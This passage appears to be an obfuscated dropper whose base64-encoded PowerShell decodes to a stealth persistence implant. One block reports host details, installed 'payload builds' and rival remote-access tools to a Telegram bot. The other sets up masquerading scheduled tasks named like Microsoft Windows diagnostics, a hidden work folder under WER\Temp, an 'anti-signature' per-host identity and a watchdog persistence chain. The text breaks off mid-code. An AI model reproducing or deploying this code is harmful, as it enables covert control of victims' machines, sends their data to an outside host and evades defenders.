JHRhc2tMaW5lcyAtam9pbiAiYG4iKQ0KDQo8Yj5DYWNoZTwvYj4NCi0gTVNJIGNhY2hlOiAkKEVz
YyAkbXNpU2l6ZSkNCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9jb2RlPg0KDQo8
Yj5QYXlsb2FkIGJ1aWxkcyAoaW5zdGFsbGVkIG9uIHRoaXMgaG9zdCk8L2I+DQotIDxjb2RlPk1P
Tj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4NCg0KPGI+
Q2FtcGFpZ24gc3RhdGU8L2I+DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPg0KDQo8
aT5Cb3Q6IEBub2J1ZGR5cm1tQm90IHwgVEdfUkVQT1JUICRiVGdyPC9pPg0KIkANCg0KIyBjb21w
YWN0IGRpZ2VzdCBtb2RlOiBvbmUgc2hvcnQgbGluZSwgSFRNTC1mcmVlIChob3VybHkgaGVhcnRi
ZWF0KQ0KaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsNCiAgICAkZm9yZWlnbk4gPSAwDQogICAg
aWYgKCRzdGF0ZU9iaiAtYW5kICRzdGF0ZU9iai5mb3JlaWduKSB7ICRmb3JlaWduTiA9IEAoJHN0
YXRlT2JqLmZvcmVpZ24pLkNvdW50IH0NCiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRt
c2lDYWNoZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVu
Z3RoIC8gMUtCKSB9IGVsc2UgeyAnMCcgfQ0KICAgICRwcmltU2hvcnQgPSBpZiAoJHByaW1Paykg
eyAnT0snIH0gZWxzZSB7ICdET1dOJyB9DQogICAgJGFsdFNob3J0ID0gaWYgKCRhbHRMaW5lIC1s
aWtlICdSdW5uaW5nKicpIHsgJ09LJyB9IGVsc2UgeyAnLScgfQ0KICAgICR0ZXh0ID0gIiRlbW9q
aSBTQ0R8JCgkZW52OkNPTVBVVEVSTkFNRSl8cHJpbT0kcHJpbVNob3J0fGFsdD0kYWx0U2hvcnR8
Zm9yZWlnbj0kZm9yZWlnbk58dGFza3M9JHRhc2tPay81fG1zaT0kbXNpU2hvcnR8dXA9JHVwdGlt
ZXxiPSRCdWlsZHwkbm93Ig0KfQ0KDQppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAg
JHJtbUhpdHMgPSBAKCgkcm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0g
Li4uICh7MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0ID0g
QCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0gLi4uICh7MH0gbW9y
ZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIN
Cn0NCg0KJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5k
LVRnKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQogICAgICAgIHRl
eHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9w
cmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYgKCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21v
ZGUgPSAkbW9kZSB9DQogICAgJGpzb24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21w
cmVzcyAtRGVwdGggNQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgu
R2V0Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBzOi8vYXBp
LnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVzc2FnZSIpIGANCiAgICAg
ICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pz
b247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUo
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0
cnkgew0KICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAgICBy
ZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIFNl
bmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8
L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNh
dGNoIHsNCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0K
dHJ5IHsNCiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3JpY2gn
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBlbHNlIHsNCiAgICAgICAgdGhy
b3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBpZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAg
ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29r
PSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNl
dC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lfdGcuZmxh
ZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5IHsNCiAgICAgICAgJHBsYWluID0gW3Jl
Z2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxbXj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5
c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBs
YWluLkxlbmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1MDAp
ICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBsYWluIC1tb2Rl
ICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0g
Y2F0Y2ggew0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0
Z19mYWlsICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDExCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTE6IE5FVkVSIHJldXNl
IHJlYWwgV2luZG93cyBidWlsdC1pbiB0YXNrIG5hbWVzIChEaWFnbm9zaXNcU2NoZWR1bGVkIGV0
Yy4pLgojICAgICAgRXhpc3RlbmNlLW9ubHkgc2NodGFza3MgL1F1ZXJ5IHdhcyBhIGZhbHNlIE9L
IC0+IG1vbiBuZXZlciB0aWNrZWQsCiMgICAgICBubyBvd25fbW9uLmxvZywgYXV0by11cGRhdGUg
ZGVhZC4gSURFTlRWRVI9NiB1bmlxdWUgbmFtZXMgKyBUUiBvd25lcnNoaXAuCiMgTDg6IFRlc3Qt
U0NSZWdpc3RlcmVkIGZpeGVkIChGb3JFYWNoLU9iamVjdCByZXR1cm4gbmV2ZXIgbGVmdCBmdW5j
dGlvbik7CiMgICAgIERpc3BsYXlOYW1lIC1pZXEgZXhhY3QgbWF0Y2g7IHJlcGFpciBHVUlEIHdh
bGsgdXNlcyBmb3JlYWNoOwojICAgICBTQyByZXNlYXJjaDogcGVyLUZQIFVwZ3JhZGVDb2RlICsg
bGVnYWN5IGZhbWlseSBVcGdyYWRlIHJvd3MgbWVhbgojICAgICBtc2lleGVjIC9pIG9mIHByaW1h
cnkgY2FuIHJlbW92ZSBzaWJsaW5ncyAtIHByZWZlciAvZmEgYWx3YXlzLgojIEw3OiBGSVhFRCBX
T1c2NDMyTm9kZSB1bmluc3RhbGwgaGl2ZSBwYXRoOyBoYXJkZW5lZCBJbnZva2UtRXh0ZXJtaW5h
dGUuCiMgQXV0aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNj
b3BlIG9ubHkuCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCltDbWRsZXRCaW5kaW5nKCldCnBhcmFtKAog
ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICBbVmFsaWRhdGVTZXQoJ2luaXQn
LCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tzLWVuc3VyZScsICdzdGF0ZScs
ICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0ZScpXQogICAg
W3N0cmluZ10kQWN0aW9uLAogICAgW3N0cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxN
aWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZScsCiAgICBbc3RyaW5nXSRNb25QYXRo
ID0gJycsCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1JywKICAgIFtzdHJpbmddJEV4dHJhICA9
ICcnLAogICAgW3N0cmluZ10kRnAgICAgID0gJycKKQoKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9
ICdTaWxlbnRseUNvbnRpbnVlJwokY2ZnUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRp
dHkuY2ZnJwokSWRlbnRWZXJzaW9uID0gNgoKIyBMZWdpdC1sb29raW5nIHRhc2stbmFtZSBwb29s
czsgcGVyLWhvc3QgaGFzaCBwaWNrcyBvbmUgcGVyIHNsb3QuCiMgUGFyZW50IGZvbGRlcnMgbXVz
dCBleGlzdCBvbiBXaW4xMC8xMS4gQ2hpbGQgbmFtZXMgbXVzdCBOT1QgYmUgcmVhbCBPUyB0YXNr
cwojICh2NSBwb29scyBjb2xsaWRlZCB3aXRoIERpYWdub3Npc1xTY2hlZHVsZWQgLyBXRElcUmVz
b2x1dGlvbkhvc3QgLyBldGMuKS4KJFBvb2xzID0gQHsKICAgIEEgPSBAKCdcTWljcm9zb2Z0XFdp
bmRvd3NcRGlhZ25vc2lzXEV2dENhY2hlU3luYycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9z
aXNcUmVjb21tZW5kZWRDYWNoZScsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJO
ZXR3b3JrSW5mb0V4JywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdFByb3h5
JywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXJIZWFsdGgnLCdcTWljcm9zb2Z0XFdpbmRv
d3NcVGNwaXBcSXBDb25mbGljdFJlc29sdmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Np
c1xTUkNhY2hlJywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uUXVldWUnKQogICAg
QiA9IEAoJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVySGVhbHRoJywnXE1pY3Jvc29mdFxX
aW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdFByb3h5JywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdu
b3Npc1xFdnRDYWNoZVN5bmMnLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0VHJhY2VcR2F0aGVyTmV0
d29ya0luZm9FeCcsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcUmVjb21tZW5kZWRDYWNo
ZScsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcENvbmZsaWN0UmVzb2x2ZXInLCdcTWljcm9z
b2Z0XFdpbmRvd3NcUExBXFNlcnZlckRpYWdQcm94eScsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFn
bm9zaXNcU1JDYWNoZScpCiAgICBDID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0
aW9uUXVldWUnLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm9F
eCcsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcENvbmZsaWN0UmVzb2x2ZXInLCdcTWljcm9z
b2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEV2dENhY2hlU3luYycsJ1xNaWNyb3NvZnRcV2luZG93c1xQ
TEFcU2VydmVySGVhbHRoJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xSZWNvbW1lbmRl
ZENhY2hlJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXJEaWFnUHJveHknLCdcTWljcm9z
b2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0UHJveHknKQogICAgRCA9IEAoJ1xNaWNyb3Nv
ZnRcV2luZG93c1xUY3BpcFxJcENvbmZsaWN0UmVzb2x2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3Nc
V0RJXFJlc29sdXRpb25RdWV1ZScsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJO
ZXR3b3JrSW5mb0V4JywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xSZWNvbW1lbmRlZENh
Y2hlJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXJEaWFnUHJveHknLCdcTWljcm9zb2Z0
XFdpbmRvd3NcRGlhZ25vc2lzXEV2dENhY2hlU3luYycsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFc
U2VydmVySGVhbHRoJywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdFByb3h5
JykKfQokRGVmYXVsdHMgPSBbb3JkZXJlZF1AewogICAgVEFTS19BID0gJ1xNaWNyb3NvZnRcV2lu
ZG93c1xEaWFnbm9zaXNcRXZ0Q2FjaGVTeW5jJwogICAgVEFTS19CID0gJ1xNaWNyb3NvZnRcV2lu
ZG93c1xQTEFcU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1xNaWNyb3NvZnRcV2luZG93c1xX
RElcUmVzb2x1dGlvbkhvc3RQcm94eScKICAgIFRBU0tfRCA9ICdcTWljcm9zb2Z0XFdpbmRvd3Nc
VGNwaXBcSXBDb25mbGljdFJlc29sdmVyJwogICAgTU9fQSAgID0gJzInCiAgICBNT19CICAgPSAn
MycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0gMEwKICAgIGZvcmVhY2ggKCRj
IGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJBcnJheSgpKSB7ICRzID0gKCRz
ICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0dXJuICRzCn0KCmZ1bmN0aW9u
IFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkKICAgIGlmIChUZXN0
LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAgICAgICAgaWYgKCRsaW5lIC1t
YXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0g
PSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRpZAp9CgpmdW5jdGlv
biBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBpZiAoJHRuKSB7ICYgc2NodGFz
a3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51bGwgfQp9CgpmdW5jdGlvbiBH
ZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0
dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElT
VCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUgMCAtb3IgLW5vdCAkb3V0KSB7
IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0p
IC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10kdG4sIFtz
dHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhlIHNjaGVkdWxlZCBhY3Rpb24g
cG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdpbmRvd3MgQ09NIGhhbmRsZXIu
CiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICBpZiAoLW5vdCAkYmxvYikg
eyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQgKCRibG9iIC1tYXRjaCBbcmVn
ZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICBpZiAoJGJsb2IgLW1h
dGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLmV0bGNhY2hl
XFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEluaXRp
YWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJREVOVFZFUiBnZW5l
cmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAgICAjIG93bmVkIG9sZC1uYW1l
IHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3aXRoIHNhbWUgbmFtZSBhcmUg
bGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICAkb2xkID0g
UmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5lcmF0ZSBpZiBhbnkgVEFTS18q
IGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQgYmxhbmsgc2xvdHMpCiAgICAg
ICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAtYW5k
ICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xkWydUQVNLX0MnXSAt
YW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09rKSB7IHJldHVybiAkb2xkIH0K
ICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19E
JykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdCiAgICAgICAgICAgIGlmICgt
bm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2ZXIgZGVsZXRlIGEgcmVhbCBX
aW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9jdXN0b20gaGFuZGxlcikuCiAg
ICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykgeyBSZW1vdmUtVGFza1F1aWV0
ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0
aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAgICAjIEw0OiB0d28gc2xvdHMg
bWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4KICAg
ICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdvIHNsb3RzIGFuZCB0aGUgZmxl
ZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3YXJkIHVudGlsIHRoZSBwaWNr
IGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUgb2xkIEAoQCgnQScsICRzICUg
OCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1LjE6CiAgICAjIGJhcmUgJSBp
bnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1bG8p
LCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5kIHRoZSBsb29wIG5ldmVyIHJh
biAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tfKiBhbmQgdGhlIHdob2xlIGZs
ZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNrIG5hbWVzLgogICAgJHNlZWRz
ID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAgICAgICBCID0gKCgkcyArIDMp
ICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAgICBEID0gKCgkcyArIDcpICUg
OCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBmb3JlYWNoICgkbGV0dGVyIGlu
ICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0kc2VlZHNbJGxldHRlcl0KICAg
ICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAgICAkbiA9IDAKICAgICAgICB3
aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRuIC1sdCA4KSB7ICRpID0g
KCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07ICRuKysgfQogICAgICAg
IGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9CiAg
ICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAgJGNmZyA9IEAoCiAgICAgICAg
IlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgkcGljay5CKSIKICAgICAgICAi
VEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRwaWNrLkQpIgogICAgICAgICJN
T19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWluIGppdHRlcgogICAgICAgICJN
T19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWluIGppdHRlcgogICAgICAgICJT
RUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9uIgogICAgKQogICAgU2V0LUNv
bnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2ZnIC1Gb3JjZQogICAgcmV0dXJu
IChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBFbnN1cmUtUGVyc2lzdFRhc2tzIHsKICAgICMg
Q3JlYXRlL3JlcGFpciBBLUQgb25seSB3aGVuIG1pc3NpbmcgT1IgVGFzayBUbyBSdW4gaXMgbm90
IG91cnMgKFdpbmRvd3MgY29sbGlzaW9uKS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkK
ICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdv
d25fbW9uLmNtZCcgfQogICAgJGV0bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlh
Z25vc2lzXFN0YXRlXC5ldGxjYWNoZScKICAgICRldGxNb24gPSBKb2luLVBhdGggJGV0bERpciAn
ZXRsX21vbi5jbWQnCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZXRsRGly
KSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRldGxEaXIgLUZvcmNlIHwg
T3V0LU51bGwgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1vblBhdGgpIHsKICAg
ICAgICB0cnkgeyBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAk
ZXRsTW9uIC1Gb3JjZSB9IGNhdGNoIHt9CiAgICB9CiAgICAkbW9BID0gW3N0cmluZ10kaWRbJ01P
X0EnXTsgaWYgKC1ub3QgJG1vQSkgeyAkbW9BID0gJzInIH0KICAgICRtb0IgPSBbc3RyaW5nXSRp
ZFsnTU9fQiddOyBpZiAoLW5vdCAkbW9CKSB7ICRtb0IgPSAnMycgfQogICAgJHNwZWNzID0gQCgK
ICAgICAgICBAeyBLZXkgPSAnVEFTS19BJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAn
TUlOVVRFJzsgTW8gPSAkbW9BOyBUciA9ICJjbWQuZXhlIC9jICRNb25QYXRoIiB9CiAgICAgICAg
QHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7
IE1vID0gJG1vQjsgVHIgPSAiY21kLmV4ZSAvYyAkZXRsTW9uIiB9CiAgICAgICAgQHsgS2V5ID0g
J1RBU0tfQyc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcn
OyBUciA9ICJjbWQuZXhlIC9jICRNb25QYXRoIiB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfRCc7
IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICJj
bWQuZXhlIC9jICRNb25QYXRoIiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9IDA7ICRm
